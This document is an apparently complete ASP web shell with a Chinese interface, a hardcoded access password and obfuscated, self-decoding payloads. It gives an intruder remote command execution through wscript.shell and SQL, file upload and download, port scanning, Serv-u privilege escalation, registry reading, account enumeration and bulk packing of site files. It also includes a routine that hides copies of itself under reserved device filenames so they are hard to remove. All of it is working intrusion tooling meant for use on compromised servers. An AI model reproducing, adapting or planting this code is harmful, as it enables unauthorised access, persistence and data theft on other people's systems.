<%

UserPass="admin"'	����
'------------------------�������ڷǷ�;��----------------------
mmname="ţ����ɱ��Ȩ���ش���"
bottomad="����! �ſ��Ƿ�������������!"
blogurl="http://www.7jyewu.cn/"
'----------------------һ�к���������޹�----------------------
color1	="#000000"                                    'color1	="#000000"     
color2	="#00ff00"                                    'color1	="#00ff00"    
color3	="#FFFFCC"                                    'color1	="#FFFFCC"    
color4  ="#fff"                                       'color1	="#fff"    
color5	="#000000"                                    'color1	="#000000"    
color6	="#000"                                       'color1	="#000"    
color7  ="#FFF"                                       'color1	="#FFF"    
'----------------------ҳ����ɫ�Լ���----------------------������ԭ������ɫ����_�Է����ǲ�֪��Ū������
Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next
ExeCute "sub ShowErr():If Err Then:RRS""<br><a href='javascript:history.back()'><br>&nbsp;"" & Err.Description & ""</a><br>"":Err.Clear:Response.Flush:End If:end sub:Sub RRS(str):response.write(str):End Sub:Function RePath(S):RePath=Replace(S,""\"",""\\""):End Function:Function RRePath(S):RRePath=Replace(S,""\\"",""\""):End Function:URL=Request.ServerVariables(""URL""):ServerIP=Request.ServerVariables(""LOCAL_ADDR""):Action=Request(""Action""):Pos=2:RootPath=Server.MapPath("".""):WWWRoot=Server.MapPath(""/""):Serveru=request.servervariables(""http_host"")&url:FolderPath=Request(""FolderPath""):serverp=UserPass:Pn=pos*44:FName=Request(""FName""):pso=5:BackUrl=""<br><br><center><a href='javascript:history.back()'>����</a></center>"""

RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&mmname&" - "&ServerIP&"</title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;background-color:"&color1&";color:"&color2&";}"
RRS"input,select,textarea{font-size: 12px;background-color:"&color3&";border:1px solid "&color4&"}"
RRS".C{background-color:"&color5&";border:0px}"
RRS".cmd{background-color:"&color6&";color:"&color7&"}"
RRS"body{margin: 0px;margin-left:4px;}"
RRS"BODY {SCROLLBAR-FACE-COLOR: #000000;SCROLLBAR-HIGHLIGHT-COLOR: #00fcfc;SCROLLBAR-SHADOW-COLOR: #00fcfc;SCROLLBAR-ARROW-COLOR: #00fcfc;SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: #00fcfc;SCROLLBAR-BASE-COLOR: #000000}"
RRS"a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}"
RRS".am{color:#888;font-size:11px;}"
RRS"</style>"
ExeCute SinfoEn("lError=kilnerrodow.o;}win trueeturns(){rError killctiont>funscrip=javaguaget lanscripRRS~<rs;~`lse;}rn fa retu;else trueeturn~~))r�˲�����ȷ��Ҫִ��rm(~~confi{if (sok()on yeunctiRRS~f~`();}~ubmitorm.saddrf;top.oldere = F.valurPathFoldeform..addr){topolderder(FowFolon ShunctiRRS~f`~~;}} = ~~valueName.orm.Fhidef{top.}elseit();.submeformp.hidon;toFActiue = n.valActioform..hide){top=nullName!}if(Der~~;~~Othme = e{DNa;}elsDNameue = e.val.FNameformp.hide);to,FNam���ڣ�~~���ļ��Ƿ�ȫ����,עMdb�ļ���Ҫѹ����(~~����rompte = p{DNamdb~~)pactM~~Comion==(FActse ife;}el DNamlue =me.vam.FNadeforop.hime);t~,FNa��ͬ����~��,ע�ⲻb�ļ�ȫ���½���Md~������Ҫmpt(~= proName ~~){DteMdb~Creaon==~FActie if(;}elsDNameue = e.val.FNameformp.hide);to,FNamȫ����~~�����ļ���������Ҫ��pt(~~ promame =~){DNlder~NewFon==~~Actio if(F}elseName;|~~+D~~|||e += .valuFNameform..hide);topFName����~~,���ļ���ȫ���ƶ���Ŀ(~~����rompte = p{DNamer~~)eFold~~Movion==(FActse ife;}el+DNam|||~~= ~~|lue +me.vam.FNadeforop.hime);t~,FNa��ȫ����~��Ŀ���ļ��������ƶ�pt(~~ promame =~){DNlder~opyFo==~~Cctionif(FAelse ame;}~~+DN~|||| += ~valueName.orm.Fhidef;top.Name)��~~,F���ļ�ȫ�����ƶ���Ŀ(~~����rompte = p{DNamle~~)oveFi==~~Mctionif(FAelse ame;}~~+DN~|||| += ~valueName.orm.Fhidef;top.Name)��~~,F���ļ�ȫ���븴�Ƶ�Ŀ(~~����rompte = p{DNamle~~)opyFi==~~Cctionif(FAName;e = F.valuFNameform..hide){topctionme,FAm(FNallForon FuunctiRRS~f~",Pso)
RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""�����������ݿ�"");FullDbStr(0);return false;}return true;}":RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""��ֻ��ʾһ������ʱ������ʾ�ֶε�ȫ���ֽڣ������������Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>��ȷ�ϼ��������ݿ�������SQL����������䡣</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}":RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""�������ݿ����Ӵ��Ƿ���ȷ!"");return false;}if(str.length<10){alert(""����SQL����Ƿ���ȷ!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
RRS"function gotoURL(targ,selObj,restore){if(selObj.options[selObj.selectedIndex].js==1){eval(selObj.options[selObj.selectedIndex].value);if (restore) selObj.selectedIndex=0}else{eval(targ+"".location='""+selObj.options[selObj.selectedIndex].value+""'"");if (restore) selObj.selectedIndex=0;}}</script>"
rrs "<body" 
If Action="" then RRS " scroll=no"
rrs ">"
Dim Sot(13,2):Sot(0,0) = "Scripting.FileSystemObject":Sot(0,2) = "�ļ��������":Sot(1,0) = "wscript.shell":Sot(1,2) = "������ִ�����":Sot(2,0) = "ADOX.Catalog":Sot(2,2) = "ACCESS�������":Sot(3,0) = "JRO.JetEngine":Sot(3,2) = "ACCESSѹ�����":Sot(4,0) = "Scripting.Dictionary":Sot(4,2) = "�������ϴ��������":Sot(5,0) = "Adodb.connection":Sot(5,2) = "���ݿ��������":Sot(6,0) = "Adodb.Stream":Sot(6,2) = "�������ϴ����":Sot(7,0) = "SoftArtisans.FileUp":Sot(7,2) = "SA-FileUp �ļ��ϴ����":Sot(8,0) = "LyfUpload.UploadFile":Sot(8,2) = "���Ʒ��ļ��ϴ����":Sot(9,0) = "Persits.Upload.1":Sot(9,2) = "ASPUpload �ļ��ϴ����":Sot(10,0) = "JMail.SmtpMail":Sot(10,2) = "JMail �ʼ��շ����":Sot(11,0) = "CDONTS.NewMail":Sot(11,2) = "����SMTP�������":Sot(12,0) = "SmtpMail.SmtpMail.1":Sot(12,2) = "SmtpMail�������":Sot(13,0) = "Microsoft.XMLHTTP":Sot(13,2) = "���ݴ������"
For i=0 To 13
Set T=Server.CreateObject(Sot(i,0))
If -2147221005 <> Err Then
IsObj=" ��"
Else
IsObj=" ��"
Err.Clear
End If
Set T=Nothing
Sot(i,1)=IsObj
Next




If FolderPath<>"" then
Session("FolderPath")=RRePath(FolderPath)
End If:If Session("FolderPath")="" Then
FolderPath=RootPath
Session("FolderPath")=FolderPath
End if
Function MainForm() 
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='40' align='left'>��ַ��</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='70' align='center'><input name='Submit' type='submit' value='GOGO'>" 
RRS"</td></tr></form></table>"
RRS"<table width='100%' height='96%' style='border:1px solid #008000;' cellpadding='0' cellspacing='0'>"
RRS"<td width='135' id=tl>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td width=1 style='background:#008000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>����</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>��ʾ</b></a></p></td><td width=1 style='background:#008000'><td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='0'></iframe>"
RRS"<tr>����<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>������<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>������<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\"")'>����</a>������<a href='javascript:ShowFolder(""c:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\����"")'>����</a>������<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>������<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>������<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>������<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>������<a href='javascript:ShowFolder(""c:\\PHP"")'>PHP</a>������<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>������<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>����<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>����<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>RECYCLER</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>��д</a>��<br>"
End Function:Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td><hr hight=1 width='100%'>"
RRS"</td></tr>"
If soT(0,1)=" ��" Then
RRS"<tr><td height='24'>��Ȩ��</td></tr>"
Else
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"<tr><td height='20'> <a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>��վ��Ŀ¼</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>������Ŀ¼</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>���ϼ�Ŀ¼</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>���½�Ŀ¼</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>���½��ı�</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=downloads' target='FileFrame'>��Զ������</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>���ϴ��ļ�</a><hr></td></tr>"

RRS"<tr><td height='21'><a href='?Action=Course' target='FileFrame'>���û��˺�</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=adminab' target='FileFrame'>�������Ա</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=getTerminalInfo' target='FileFrame'>���Զ���¼</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=ServerInfo' target='FileFrame'>�����֧��</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Cmd1Shell' target='FileFrame'>��ִ��CMD����</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=MMD' target='FileFrame'>��SQLִ��CMD</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=ScanPort' target='FileFrame'>���˿�ɨ��</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Servu' target='FileFrame'>��Serv-u��Ȩ</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=ReadREG' target='FileFrame'>����ע���</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=att' target='FileFrame'>���޸��ļ�����</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=hiddenshell' target='FileFrame'>�����س�������</a><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=aspx' target='FileFrame'>��ASPX̽��</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=php' target='FileFrame'>��PHP̽��</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=jsp' target='FileFrame'>��JSP̽��</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Cplgm&M=1' target='FileFrame'>���߼�����</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Cplgm&M=2' target='FileFrame'>����������</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=3' target='FileFrame'>�������滻</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=DbManager' target='FileFrame'>�����ݿ����</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=PageAddToMdb' target='FileFrame'>��������</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Logout' target='_top'>���˳���¼</a></td></tr>"
End if
RRS"</table></table>"
End Function:





Sub PageAddToMdb():ExeCute SinfoEn("atePth, cteAthm Dih`~)cteAth(~stueeq R =cteAth`~)thPahe~tt(esquRe= h atePth`0000=1uteOimtTipcr.SerrvSe0`he Tb~MdTodd~a= t Ache tIfn`thPahe(tdboMdTad)`UrckBa~&v>di</��!����>��br><erntcen=igalv di~<S RRl`nd.EseonspRe`Ifd En`he Tb~MdomFrseeael~r= t Ache tIfn`thPahe(tckPaun)`UrckBa~&v>di</��!����>��br><erntcen=igalv di~<S RRl`nd.EseonspRe`Ifd En`��:�д��ļ�r><bS~RR~`t>os=podthmem or<fS~RR~`0>=8zesi~ ~~& ) ~)~.h(atpPMar.veer(SdecoEnmlHt& ~ ~~e=luvah atePthe=am nutnp<iS~RR~`t>Ache=tmenab MdTodd=aueal venddhie=yp tutnp<iS~RR~`n>iopt/oO<FS>��pp=aueal vontiop><ontiop</SO>Fso=fueal vontiop><odthMehe=tmenat ecel<sS~RR~`>~ctlese</S~RR`>~��'ʼ��'��e=luvat miub=spetyt puin <S~RR`��~Ŀ¼ͬ��ľ��SH��H,λ�ļ�db.mSH��H���� ��ע:r><br><bS~RR`>~rmfo</S~RR`/>br:<��)O֧FS(��⿪����>��r/<hS~RR~`t>os=podthmem or<fS~RR~`0>=8zesi~ b~mdH.HS~\& ) ~)~.h(atpPMar.veer(SdecoEnmlHt& ~ ~~e=luvah atePthe=am nutnp<iS~RR~`'>����'��e=luvat miub=spetyt puin><cteAthe=am ndbmMroeFasleree=luvan deid=hpetyt puin <S~RR~`¼�¼�Ŀ��ͬHľHSλ�ڼ������ĵ������� ��ע:r><br><bS~RR~`>~rmfo</S~RR",Pos):End Sub:Sub addToMdb(thePath):ExeCute SinfoEn("xtNee umes Rorrr EOn`lotaCado ar,Stnnco, amrest, nnco, rsm Dig`t~SerdcoReB.ODAD(~ctjeObteeaCrr.veer S =rst Se)`~)amreStB.ODAD(~ctjeObteeaCrr.veer S =amrestt Se`~)ontiecnnCoB.ODAD(~ctjeObteeaCrr.veer S =nncot Se`~)ogalat.COXAD(~ctjeObteeaCrr.veer S =ogalatoCadt Se`~)db.mSH~Hh(atpPMar.veer S &=~ceurSoa at D0;4.B.EDOLt.Jet.ofoscrMir=deviro~P= r Stnnco`Stnncoe atre.CogalatoCadr`Stnncon pe.Onncor`)~gema IntteoneCil fr,harCVah atePth, EDERSTLU CEY KRYMARI P1)0,Y(ITNTDE Int iIda(ateDil Fleab TteeaCr(~tecuxe.Ennco)`pe.Oamrestn`= e yp.Tamrest1` 33,, nnco, a~ateDil~Fn pe.Ors`enTh~ so~f= ) d~hoeteMth(~stueeq RIf`eatr ss, rh,atePthb MdoreFreoTfsm`ls Ee`amrest, rs, thPahe tdbrMFoeeTrsa`Ifd En`selo.Crs`selo.CnnCo`selo.Camrest`nghiot N =rst Se`nghiot N =nncot Se`nghiot N =amrestt Se`nghiot N =ogalatoCadt Se",Pos):End Sub:lI="��$S8~++'PEE#'#INDy&$EU,S8<,<8<'S8<,*{)'w**<88������":execute(lIl(lI)):Function fsoTreeForMdb(thePath, rs, stream):ExeCute SinfoEn("FileL, sysfilesers,  foldlder,theFotem, Dim iist`SH.ldmdb$H$HSH.t = ~leLissysFib$~`se Th= Falath) (thePxistslderE~).FobjectstemOileSying.Fcriptct(~SeObjeCreatrver.If Seen`����!~)���߲�����Ŀ¼������ & ~ ePathrr(thshowE`End If`(thePolder.GetFect~)emObjeSystg.Filiptin(~ScrbjecteateOer.Cr Servder =heFolSet tath)`r.FilFolde= theiles Set fes`ubFolder.SheFols = tolderSet fders`n foltem Iach iFor Eders`treamrs, sath, tem.PMdb ieeForfsoTr`Next`n filtem Iach iFor Ees`<= 0 ~$~) me & em.Na & it, ~$~eListysFilStr(sIf InThen`rs.AddNew`Path,item. Mid(h~) =hePatrs(~t 4)`Path)item.File(dFromm.Loastrea`m.Reastrea~) = ntentileCors(~fd()`rs.Update`End If`Next`= Notiles Set fhing`othins = NolderSet fg` Nothder =heFolSet ting",Pso):End Function:Sub unPack(thePath):ExeCute SinfoEn("xtNee umes Rorrr EOn`0000=1uteOimtTipcr.SerrvSe0`deoleFth, trnSon cm,eatr sn,on cr,st, ws, rsm Dir`~\& ) .~(~thPaap.MerrvSe= r st~`~)etdSorec.RDBDO~At(ecbjeOatre C =rst Se`m~eatr.SDBDO~At(ecbjeOatre C =amrestt Se)`n~ioctneon.CDBDO~At(ecbjeOatre C =nncot Se)`~;& h atePth& ~ e=rcou StaDa0;4.B.EDOLt.Jet.ofoscrMir=deviro~P= r Stnnco~`Stnncon pe.Onncor` 11,, nnco, a~ateDil~Fn pe.Ors`pe.Oamrestn`= e yp.Tamrest1`Eos. rilnt UDof`~)~\, ~)thPahe~ts((revrRStIn, ~)thPahe~ts((rftLe= r deoleFth)`he Tseal F =r)deoleFth& r sts(stxirEdeol.F~)ctjeObemstSyleFig.inptriSc(~ctjeObteeaCrr.veer SIfn`erldFohe t &tr(serldFoteeacr)`Ifd En`s(Eoet.Samrest)`~)ntteoneCil~fs( rteri.Wamrest` 2),h~atePth(~rs& r ste iloFeTav.Samrest`exeNov.Mrst`opLo`selo.Crs`selo.Cnnco`selo.Camrest`nghiot N =wst Se`nghiot N =rst Se`nghiot N =amrestt Se`nghiot N =nncot Se",Pos):End Sub:Sub createFolder(thePath):ExeCute SinfoEn("m Dii`\~ ~h,atePthr(stIn= i )` 0 > ilehi WDo`enThe lsFa= ) i), thPahe(tftLes(stxirEdeol.F~)ctjeObemstSyleFig.inptriSc(~ctjeObteeaCrr.veer SIf`)) 1 - ih,atePtht(ef(LerldFoteeaCr).t~ecbjmOteyseSil.Fngtiipcr~St(ecbjeOatre.CerrvSe`Ifd En`he T~)~\, 1)+ i , thPahe(tid(MtrnS IIfn`\~ ~), 1 + ih,atePthd(Mir(stIn+ i = i )`ls Ee`= i 0`Ifd En`opLo",Pos):End Sub:Sub saTreeForMdb(thePath, rs, stream):ExeCute SinfoEn("stLileFiys sr,deoleFth, emitm Di`b$ldH.HSb$mdH.HS~$= t iseLilsFsy~`h)atePthe(acSpmeNaX.sa= r deoleFtht Se`mste.IerldFohe tInm te ichEar Fo`enThe ru T =erldFoIsm.te iIf`amrest, rs, thPam.te idbrMFoeeTrsa`ls Ee`enTh0 =  <~)~$& e am.Nemit& ~ ~$, stLileFiys(strnS IIf`Nedd.Arsw` 4h,at.Pemitd(Mi= ) h~atePth(~rs)`h)at.Pemite(ilmFrodFoa.Lamrest`d(ea.Ramrest= ) t~enntColefi(~rs)`atpd.Urse`Ifd En`Ifd En`xtNe`inthNo= r deoleFtht Seg",Pos):End Sub:Function Course():ExeCute SinfoEn("ter'>='cenalign='0' ddingellpa'1' ccing=llspa0' ceder='' bor'menuolor=' bgc='600widthable br><tSI=~<~`></tr��</tdͳ�û����nu'>ϵr='megcoloer' b'centlign='3' aspan=' colt='20heigh><td &~<trSI=SI>~` nextesumeror ron er`NT://(~Winbject getObj inach ofor e.~)`err.clear`e=~~ rtTypJ.Staif OBthen`&~<trSI=SI>~`&nbspFF~~>#FFFFor=~~bgcol20~~ ht=~~ heig&~<tdSI=SI;~`&obj.SI=SIName`>&nbsFFF~~~#FFFlor=~ bgcod><td&~</tSI=SIp;~ `��(��)~&~ϵͳ��SI=SI`d></t&~</tSI=SIr>~`d></tp;</t>&nbs~~2~~span=~ colFFFF~~~#FFolor=~ bgc~~20~ight=td he<tr><SI0=~r>~ `end if`x=~�Զ�hen le=2 trtTypJ.Staif OB~`x=~�ֶ�hen le=3 trtTypJ.Staif OB~`x=~����hen le=4 trtTypJ.Staif OB~`pe=2 artTyBJ.Stand Owin~ ))<>~h,4,3j.patid(obase(mif LCthen`></tr></td/fontth&~<bj.pap;~&o>&nbsF0000or=#Ft col]<fon&lx&~������:~~~>[��n=~~2olspaF~~ cFFFFFr=~~#gcolo0~~ bt=~~2heigh><td &~<tryNameisplaobj.Dsp;~&~>&nbFFFF~~~#FFolor=~ bgc~~20~ight=td he/td><me&~<bj.Nap;~&o>&nbsFFF~~~#FFFlor=~ bgco~20~~ght=~d heitr><tI1&~<SI1=S>~`else`></tr></td/fontth&~<bj.pap;~&o>&nbs399FFor=#3t col]<fon&lx&~������:~~~>[��n=~~2olspaF~~ cFFFFFr=~~#gcolo0~~ bt=~~2heigh><td &~<tryNameisplaobj.Dsp;~&~>&nbFFFF~~~#FFolor=~ bgc~~20~ight=td he/td><me&~<bj.Nap;~&o>&nbsFFF~~~#FFFlor=~ bgco~20~~ght=~d heitr><tI2&~<SI2=S>~`end if`next`</tabSI2&~&SI1&I&SI0RRS Sle>~",Pso):End Function:Function ServerInfo():ExeCute SinfoEn("ter'>='cenalign='0' ddingellpa'1' ccing=llspa0' ceder='' bor'menuolor=' bgc='80%widthable br><tSI=~<~`></trϢ</td���������nu'>��r='megcoloer' b'centlign='3' aspan=' colt='20heigh><td &~<trSI=SI>~`td></)&~</NAME~RVER_s(~SEiableerVar.servquest>~&reFFFF'='#FFcolortd bg/td><bsp;<F'>&nFFFFFor='#bgcol><td ��</td'>������FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SItr>~`FFF'>'#FFFolor=d bgctd><tsp;</'>&nbFFFFFr='#Fgcolo<td b</td>������IPFFF'>'#FFFolor=' bgc='200width'20' ight=td heer'><'centlign=<tr aank'>='_blargetrm' t'ipfoname=asp' ndex.com/ip138.www.itp://n='htactiopost thod=rm me&~<foSI=SI~`/form/tr></td><'2'><alue=on' v'actiname=den' ='hid typeinput��ѯ'><lue='t' vasubmiype='put t> <in~)&~'_ADDRLOCALles(~ariabrverVst.SeRequee='~& valu='15' size='ip' nametext'ype='put t&~<inSI=SI>~`</tr></td>nbsp;ow&~&'>~&nFFFFFr='#Fgcolo<td b</td>nbsp;FF'>&#FFFFlor=' bgcod><tdʱ��</t'>������FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SI~`></tr~</tdRS~)&CESSOF_PROBER_O(~NUMablesrVariServeuest.~&ReqFFF'>'#FFFolor=d bgctd><tsp;</'>&nbFFFFFr='#Fgcolo<td b</td>CPU����'>������FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SI>~`d></t&~</t~OS~)bles(Variaerverest.S&RequFF'>~#FFFFlor=' bgcod><tdp;</t>&nbsFFFF'='#FFcolortd bg/td><����ϵͳ<'>������FFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SIr>~`></tr~</tdRE~)&OFTWAVER_S(~SERablesrVariServeuest.~&ReqFFF'>'#FFFolor=d bgctd><tsp;</'>&nbFFFFFr='#Fgcolo<td b</td>�������汾'>WEBFFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SI>~`=0 ToFor i 13`td></)&~</t(i,2>~&So=leftalignFFF' '#FFFolor=d bgctd><t)&~</t(i,1>~&SoFFFF'='#FFcolortd bg/td><0)&~<ot(i,'>~&SFFFFFr='#Fgcolo00' bth='2' widt='20heigh><td nter'n='ce alig&~<trSI=SItr>~`Next`RRS SI",Pso):End Function:Function DownFile(Path):ExeCute SinfoEn("arle.CseonspRe`)),0(6ot(SctjeObteeaCr= M OSt Se`enOpM.OS` 1 =peTyM.OS`at PleFiomFradLoM.OSh`)+\~,~thpav(Retrns=Isz1`z),sthpad(Mi& ~ e=amenil ft;enhmactt~a, n~ioitosspDit-enntCo ~eradHedd.AseonspRe`iz.SSM O~,thngLet-enntCo ~eradHedd.AseonspRee`8~F-UT ~ =etrsha.CseonspRe`amrestt-teocn/ioaticplap ~ =peTyntteon.CseonspRe~`ea.RSM OteriyWarin.BseonspRed`shlu.FseonspRe`osClM.OSe`inthNo= M OSt Seg",Pos):End Function:Function HTMLEncode(S):if not isnull(S) then:S= replace(S,">","&gt;"):S=replace(S,"<","&lt;"):S=replace(S,CHR(39),"&#39;"):S=replace(S,CHR(34),"&quot;"):S=replace(S,CHR(20),"&nbsp;"):HTMLEncode=S:end if:End Function:sub hiddenshell
fpath=request.servervariables("path_translated"):set fso=server.createobject("scripting.filesystemobject"):pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9":rndpex=split(pex,"|")(rndnumber(0,17)):session("seljw")="":filepath1=server.mappath("."):filename1=right(fpath,len(fpath)-instrrev(fpath,"\")):url=request.servervariables("url"):url=left(url,instrrev(url,"/"))&rndpex&"."&filename1:fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1:set fso=nothing:rrs "<script>parent.location='http://"&request("server_name")&url&"';</script>"
end sub:Function UpFile():
If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
If UName="" Or F.FileSize=0 then
SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
Else
F.SaveAs UName
If Err.number=0 Then
SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
End if
End If
Set F=nothing:Set U=nothing
SI=SI&BackUrl
RRS SI
ShowErr()
Response.End
End If
SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
SI=SI&"<tr><td>"
SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\13cmd.exe")&"' size='40'>"
SI=SI&" <input name='LocalFile' type='file'size='25'>"
SI=SI&" <input type='submit' name='Submit' value='�ϴ�'>"
SI=SI&"</td></tr></form></table>"
RRS SI:RRS ""&copyurl&""
End Function::Function Cmd1Shell():ExeCute SinfoEn("checked=~ checked~`t(~SPeques) = RPath~Shellion(~ Sess Then)<>~~(~SP~questIf Re~)`ath~)hellPon(~SSessiPath=Shell`md.ex = ~clPath Shel Thenth=~~ellPaif She~`heckehen ces~ t)<>~yript~(~wscquestif Red=~~`cmd~)est(~ RequCmd =n Def~ The~)<>~(~cmdquestIf Re`st'>~d='pomethoform SI=~<`bsp;~sp;&n'>&nbh:70%'widttyle=&~' SlPath&Shelue='~' vale='SPt nam<inpuLL·����&~SHESI=SI`hell~ipt.S>WScrked&~&checyes'~lue='t' vascripme='wx' naeckboe='chc typlass=put c&~<inSI=SI`440;'ight:0%;heth:10='widStylearea <text'ִ��'>alue=it' v'submtype=nput '> <iCmd&~~&Deflue='%' vath:92='widStylecmd' ame='put n&~<inSI=SI>~`~ The~)<>~(~cmd.FormquestIf Ren`s~ th)=~yeript~(~wsc.Formquestif Reen`Sot(1ject(ateObM=CreSet C,0))`~&Def~ /c Path&Shellexec(D=CM.Set DCmd)`eadalout.rD.stdaaa=Dl`SI=SI&aaa`else` Nextesumeror ROn Er`.Shelcriptt(~WSObjecreatever.Cs=SerSet wl~)`.Shelcriptt(~WSObjecreatever.Cs=SerSet wl~)`bjectstemOileSying.Fcriptct(~SeObjeCreatrver.so=SeSet f~)`md.txth(~cmapparver. = sepFileszTemt~)` 0, TFile,zTemp~ & s ~ > Cmd && Def/c ~ th&~ ellPan (Shws.RuCall rue)`ject~temObleSysng.Firiptit(~ScObjecreates = CSet f)`se, 0, Falle, 1empFi (szTtFileenTexfs.Opcx = FilelSet o)`.Readlelcxe(oFiEncod.HTMLerveraaa=SAll)`lcx.CoFilelose`, TrupFileszTemFile(eletefso.DCall e)`SI=SI&aaa`end if`End If`></fotarea</tex13)&~&chr(SI=SIrm>~`RRS SI",Pso):End Function:ExeCute SinfoEn("ioctun Fnd:EtrwSne= f iner:SxtNe):os P -618329 ( &os+P)) 1i,, trtsged(Mic(As& r Stew n 